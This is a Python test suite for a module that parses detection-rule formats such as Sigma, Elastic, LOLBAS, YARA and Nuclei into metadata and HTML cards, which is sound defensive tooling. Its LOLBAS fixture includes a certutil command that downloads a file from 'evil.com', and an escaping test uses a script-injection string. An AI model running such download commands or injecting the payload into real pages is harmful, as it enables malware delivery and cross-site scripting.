"""Tests for github_content_types — metadata extraction and structured rendering."""

from app.adapters.github_content_types import (
    _extract_attack_tags,
    extract_metadata,
    render_content,
)

# ---------------------------------------------------------------------------
# ATT&CK tag extraction
# ---------------------------------------------------------------------------


class TestAttackTagExtraction:
    def test_technique_ids(self):
        tags = ["attack.t1059.001", "attack.t1027", "attack.execution"]
        ids, tactics = _extract_attack_tags(tags)
        assert ids == ["T1059.001", "T1027"]
        assert tactics == ["Execution"]

    def test_tactics(self):
        tags = ["attack.initial_access", "attack.defense_evasion", "attack.persistence"]
        ids, tactics = _extract_attack_tags(tags)
        assert ids == []
        assert "Initial Access" in tactics
        assert "Defense Evasion" in tactics
        assert "Persistence" in tactics

    def test_mixed(self):
        tags = ["attack.t1059", "attack.execution", "cve.2024.1234", "other"]
        ids, tactics = _extract_attack_tags(tags)
        assert ids == ["T1059"]
        assert tactics == ["Execution"]

    def test_empty(self):
        ids, tactics = _extract_attack_tags([])
        assert ids == []
        assert tactics == []

    def test_non_string_tags(self):
        ids, tactics = _extract_attack_tags([123, None, "attack.t1059"])
        assert ids == ["T1059"]


# ---------------------------------------------------------------------------
# Sigma metadata extraction
# ---------------------------------------------------------------------------


class TestSigmaMetadata:
    SIGMA_CONTENT = """title: Certutil Download
description: Detects certutil downloading files
status: stable
level: high
author: Florian Roth
date: 2024/01/15
modified: 2024/02/01
logsource:
    product: windows
    category: process_creation
    service: sysmon
detection:
    selection:
        CommandLine|contains: 'certutil'
    condition: selection
falsepositives:
    - Legitimate admin activity
    - Software updates
tags:
    - attack.t1105
    - attack.command_and_control
    - attack.t1059.001
    - attack.execution
"""

    def test_basic_fields(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        assert meta["rule_title"] == "Certutil Download"
        assert meta["rule_status"] == "stable"
        assert meta["rule_level"] == "high"
        assert meta["rule_author"] == "Florian Roth"

    def test_attack_ids(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        assert "T1105" in meta["mitre_attack_ids"]
        assert "T1059.001" in meta["mitre_attack_ids"]

    def test_tactics(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        assert "Command And Control" in meta["mitre_tactics"]
        assert "Execution" in meta["mitre_tactics"]

    def test_log_source(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        assert meta["log_source"]["product"] == "windows"
        assert meta["log_source"]["category"] == "process_creation"
        assert meta["log_source"]["service"] == "sysmon"

    def test_false_positives(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        assert len(meta["false_positives"]) == 2
        assert "Legitimate admin activity" in meta["false_positives"]

    def test_malformed_yaml(self):
        # YAML parses ":::invalid:::" as a dict, so we get empty-valued metadata
        meta = extract_metadata(":::invalid:::", "sigma_rule")
        assert meta.get("rule_title") == ""

    def test_truly_invalid_yaml(self):
        meta = extract_metadata("- [unclosed", "sigma_rule")
        assert meta == {}

    def test_none_content(self):
        meta = extract_metadata(None, "sigma_rule")
        assert meta == {}


# ---------------------------------------------------------------------------
# Elastic metadata extraction
# ---------------------------------------------------------------------------


class TestElasticMetadata:
    ELASTIC_CONTENT = """[metadata]
creation_date = "2024/01/15"

[rule]
name = "Potential Certutil Abuse"
description = "Detects usage of certutil for download"
severity = "high"
risk_score = 73
type = "eql"
query = "process where process.name == 'certutil.exe'"
index = ["winlogbeat-*", "logs-endpoint*"]

[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1105"
name = "Ingress Tool Transfer"
[[rule.threat.technique.subtechnique]]
id = "T1105.001"
name = "Subtech"
[rule.threat.tactic]
id = "TA0011"
name = "Command and Control"
"""

    def test_basic_fields(self):
        meta = extract_metadata(self.ELASTIC_CONTENT, "elastic_rule")
        assert meta["rule_name"] == "Potential Certutil Abuse"
        assert meta["rule_severity"] == "high"
        assert meta["rule_risk_score"] == 73
        assert meta["rule_type"] == "eql"

    def test_query(self):
        meta = extract_metadata(self.ELASTIC_CONTENT, "elastic_rule")
        assert "certutil" in meta["rule_query"]

    def test_attack_ids(self):
        meta = extract_metadata(self.ELASTIC_CONTENT, "elastic_rule")
        assert "T1105" in meta["mitre_attack_ids"]
        assert "T1105.001" in meta["mitre_attack_ids"]

    def test_tactics(self):
        meta = extract_metadata(self.ELASTIC_CONTENT, "elastic_rule")
        assert "Command and Control" in meta["mitre_tactics"]

    def test_indices(self):
        meta = extract_metadata(self.ELASTIC_CONTENT, "elastic_rule")
        assert "winlogbeat-*" in meta["rule_index"]


# ---------------------------------------------------------------------------
# Splunk metadata extraction
# ---------------------------------------------------------------------------


class TestSplunkMetadata:
    SPLUNK_CONTENT = """name: Certutil with URL Argument
description: Detects certutil downloading from URLs
type: TTP
search: '| tstats `security_content_summariesonly` count from datamodel=Endpoint'
tags:
    mitre_attack_id:
        - T1105
        - T1059.001
    analytic_story:
        - Living Off The Land
"""

    def test_basic_fields(self):
        meta = extract_metadata(self.SPLUNK_CONTENT, "splunk_detection")
        assert meta["detection_name"] == "Certutil with URL Argument"
        assert meta["detection_type"] == "TTP"

    def test_attack_ids(self):
        meta = extract_metadata(self.SPLUNK_CONTENT, "splunk_detection")
        assert "T1105" in meta["mitre_attack_ids"]
        assert "T1059.001" in meta["mitre_attack_ids"]

    def test_analytic_stories(self):
        meta = extract_metadata(self.SPLUNK_CONTENT, "splunk_detection")
        assert "Living Off The Land" in meta["analytic_stories"]

    def test_search_query(self):
        meta = extract_metadata(self.SPLUNK_CONTENT, "splunk_detection")
        assert "tstats" in meta["search_query"]


# ---------------------------------------------------------------------------
# LOLBAS metadata extraction
# ---------------------------------------------------------------------------


class TestLolbasMetadata:
    LOLBAS_CONTENT = """Name: Certutil.exe
Description: Certificate utility
Commands:
    - Command: certutil -urlcache -split -f http://evil.com/file
      Description: Download file
      Category: Download
      MitreID: T1105
    - Command: certutil -encode input output
      Description: Encode file
      Category: Encode
      MitreID: T1027
Detection:
    - IOC: certutil.exe with urlcache flag
    - IOC: certutil.exe spawned by script
Full_Path:
    - Path: C:\\Windows\\System32\\certutil.exe
"""

    def test_binary_name(self):
        meta = extract_metadata(self.LOLBAS_CONTENT, "lolbas_entry")
        assert meta["binary_name"] == "Certutil.exe"

    def test_attack_ids(self):
        meta = extract_metadata(self.LOLBAS_CONTENT, "lolbas_entry")
        assert "T1105" in meta["mitre_attack_ids"]
        assert "T1027" in meta["mitre_attack_ids"]

    def test_abuse_functions(self):
        meta = extract_metadata(self.LOLBAS_CONTENT, "lolbas_entry")
        assert "Download" in meta["abuse_functions"]
        assert "Encode" in meta["abuse_functions"]

    def test_detection_guidance(self):
        meta = extract_metadata(self.LOLBAS_CONTENT, "lolbas_entry")
        assert len(meta["detection_guidance"]) == 2

    def test_paths(self):
        meta = extract_metadata(self.LOLBAS_CONTENT, "lolbas_entry")
        assert any("certutil" in p for p in meta["paths"])


# ---------------------------------------------------------------------------
# Atomic Red Team metadata extraction
# ---------------------------------------------------------------------------


class TestAtomicMetadata:
    ATOMIC_CONTENT = """attack_technique: T1059.001
display_name: "T1059.001 - PowerShell"
atomic_tests:
    - name: Mimikatz
      supported_platforms:
          - windows
      executor:
          name: powershell
    - name: Download Cradle
      supported_platforms:
          - windows
          - linux
      executor:
          name: bash
"""

    def test_technique(self):
        meta = extract_metadata(self.ATOMIC_CONTENT, "atomic_test")
        assert meta["technique_id"] == "T1059.001"
        assert meta["technique_name"] == "T1059.001 - PowerShell"

    def test_attack_ids(self):
        meta = extract_metadata(self.ATOMIC_CONTENT, "atomic_test")
        assert "T1059.001" in meta["mitre_attack_ids"]

    def test_tests(self):
        meta = extract_metadata(self.ATOMIC_CONTENT, "atomic_test")
        assert len(meta["atomic_tests"]) == 2
        assert meta["atomic_tests"][0]["name"] == "Mimikatz"
        assert meta["atomic_tests"][0]["executor_type"] == "powershell"

    def test_platforms(self):
        meta = extract_metadata(self.ATOMIC_CONTENT, "atomic_test")
        assert "windows" in meta["supported_platforms"]
        assert "linux" in meta["supported_platforms"]


# ---------------------------------------------------------------------------
# YARA metadata extraction
# ---------------------------------------------------------------------------


class TestYaraMetadata:
    YARA_CONTENT = """rule APT_Lazarus_Loader : apt lazarus
{
    meta:
        description = "Detects Lazarus loader variant"
        author = "Florian Roth"
        reference = "https://example.com/report"
    strings:
        $s1 = "kernel32.dll"
    condition:
        $s1
}
"""

    def test_rule_name(self):
        meta = extract_metadata(self.YARA_CONTENT, "yara_rule")
        assert meta["rule_name"] == "APT_Lazarus_Loader"

    def test_tags(self):
        meta = extract_metadata(self.YARA_CONTENT, "yara_rule")
        assert "apt" in meta["rule_tags"]
        assert "lazarus" in meta["rule_tags"]

    def test_meta_fields(self):
        meta = extract_metadata(self.YARA_CONTENT, "yara_rule")
        assert "Lazarus" in meta["rule_description"]
        assert meta["rule_author"] == "Florian Roth"
        assert "example.com" in meta["rule_reference"]


# ---------------------------------------------------------------------------
# Sentinel metadata extraction
# ---------------------------------------------------------------------------


class TestSentinelMetadata:
    SENTINEL_CONTENT = """name: Suspicious Login Activity
description: Detects brute force attempts
severity: High
tactics:
    - CredentialAccess
    - InitialAccess
relevantTechniques:
    - T1110
    - T1078
query: |
    SigninLogs
    | where ResultType == "50126"
requiredDataConnectors:
    - connectorId: AzureActiveDirectory
"""

    def test_basic_fields(self):
        meta = extract_metadata(self.SENTINEL_CONTENT, "sentinel_rule")
        assert meta["rule_name"] == "Suspicious Login Activity"
        assert meta["rule_severity"] == "High"

    def test_attack_ids(self):
        meta = extract_metadata(self.SENTINEL_CONTENT, "sentinel_rule")
        assert "T1110" in meta["mitre_attack_ids"]
        assert "T1078" in meta["mitre_attack_ids"]

    def test_tactics(self):
        meta = extract_metadata(self.SENTINEL_CONTENT, "sentinel_rule")
        assert "CredentialAccess" in meta["mitre_tactics"]

    def test_query(self):
        meta = extract_metadata(self.SENTINEL_CONTENT, "sentinel_rule")
        assert "SigninLogs" in meta["rule_query"]

    def test_data_connectors(self):
        meta = extract_metadata(self.SENTINEL_CONTENT, "sentinel_rule")
        assert "AzureActiveDirectory" in meta["required_data_connectors"]


# ---------------------------------------------------------------------------
# Nuclei metadata extraction
# ---------------------------------------------------------------------------


class TestNucleiMetadata:
    NUCLEI_CONTENT = """id: cve-2024-1234
info:
    name: CVE-2024-1234 RCE
    severity: critical
    description: Remote code execution in ExampleApp
    author: pd-team
    tags: cve,rce,exampleapp
    classification:
        cve-id: CVE-2024-1234
        cvss-score: 9.8
"""

    def test_basic_fields(self):
        meta = extract_metadata(self.NUCLEI_CONTENT, "nuclei_template")
        assert meta["template_name"] == "CVE-2024-1234 RCE"
        assert meta["template_severity"] == "critical"
        assert meta["template_author"] == "pd-team"

    def test_tags(self):
        meta = extract_metadata(self.NUCLEI_CONTENT, "nuclei_template")
        assert "cve" in meta["tags"]
        assert "rce" in meta["tags"]

    def test_cve(self):
        meta = extract_metadata(self.NUCLEI_CONTENT, "nuclei_template")
        assert "CVE-2024-1234" in meta["cve_ids"]
        assert meta["cvss_score"] == 9.8


# ---------------------------------------------------------------------------
# Structured card rendering
# ---------------------------------------------------------------------------


class TestStructuredRendering:
    SIGMA_CONTENT = """title: Test Rule
description: A test detection
status: stable
level: high
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        CommandLine: test
    condition: selection
falsepositives:
    - Testing
tags:
    - attack.t1059
    - attack.execution
"""

    def test_sigma_card_rendered(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        html = render_content("rule.yml", self.SIGMA_CONTENT, "sigma_rule", meta)
        assert "rule-card" in html
        assert "sigma-rule" in html
        assert "SIGMA" in html
        assert "Test Rule" in html
        assert "high" in html
        assert "windows" in html
        assert "T1059" in html

    def test_sigma_card_false_positives(self):
        meta = extract_metadata(self.SIGMA_CONTENT, "sigma_rule")
        html = render_content("rule.yml", self.SIGMA_CONTENT, "sigma_rule", meta)
        assert "False Positives" in html
        assert "Testing" in html

    def test_fallback_without_metadata(self):
        """Without metadata, should fall back to code block."""
        html = render_content("rule.yml", self.SIGMA_CONTENT)
        assert "language-yaml" in html
        assert "rule-card" not in html

    def test_lolbas_card(self):
        content = """Name: Certutil.exe
Description: Download files
Commands:
    - Command: certutil -urlcache
      Category: Download
      MitreID: T1105
Detection:
    - IOC: certutil with urlcache
"""
        meta = extract_metadata(content, "lolbas_entry")
        html = render_content("cert.yml", content, "lolbas_entry", meta)
        assert "rule-card" in html
        assert "LOLBAS" in html
        assert "Certutil" in html

    def test_yara_card(self):
        content = """rule TestRule : apt
{
    meta:
        description = "Test"
        author = "Test Author"
    strings:
        $s1 = "test"
    condition:
        $s1
}
"""
        meta = extract_metadata(content, "yara_rule")
        html = render_content("test.yar", content, "yara_rule", meta)
        assert "rule-card" in html
        assert "YARA" in html
        assert "TestRule" in html

    def test_atomic_card(self):
        content = """attack_technique: T1059.001
display_name: PowerShell
atomic_tests:
    - name: Test
      supported_platforms:
          - windows
      executor:
          name: powershell
"""
        meta = extract_metadata(content, "atomic_test")
        html = render_content("T1059.yaml", content, "atomic_test", meta)
        assert "rule-card" in html
        assert "ATOMIC RED TEAM" in html
        assert "T1059.001" in html

    def test_no_content(self):
        html = render_content("file.yml", None)
        assert "No content available" in html

    def test_unknown_type_falls_back(self):
        html = render_content("file.yml", "test: value", "unknown_type", {"some": "meta"})
        assert "language-yaml" in html
        assert "rule-card" not in html

    def test_html_escaping_in_cards(self):
        content = 'title: <script>alert("xss")</script>\nlevel: high'
        meta = extract_metadata(content, "sigma_rule")
        html = render_content("rule.yml", content, "sigma_rule", meta)
        assert "<script>" not in html


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    def test_empty_string_content(self):
        meta = extract_metadata("", "sigma_rule")
        assert meta == {}

    def test_unknown_content_type(self):
        meta = extract_metadata("some content", "unknown_type")
        assert meta == {}

    def test_loldriver_metadata(self):
        content = """Name: VulnDriver
Description: A vulnerable driver
Category: Vulnerable Driver
Tags:
    - kernel
    - driver
"""
        meta = extract_metadata(content, "loldriver_entry")
        assert meta["driver_name"] == "VulnDriver"
        assert meta["driver_category"] == "Vulnerable Driver"
        assert "kernel" in meta["tags"]
